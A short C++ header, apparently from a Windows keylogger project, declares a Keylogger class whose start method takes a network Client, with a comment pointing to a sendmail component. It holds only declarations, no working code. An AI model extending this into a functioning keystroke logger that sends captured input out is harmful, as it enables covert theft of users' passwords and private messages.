#pragma once

#include "client.h"
#include "stdafx.h"
#include <iostream> 
#include <string>
#include <windows.h> 
#include <thread>



#define DEBUG true


class Keylogger //0$
{
public:
	std::string pressedKey();
	void start(const Client & client);
};
//sendmail.h 1$



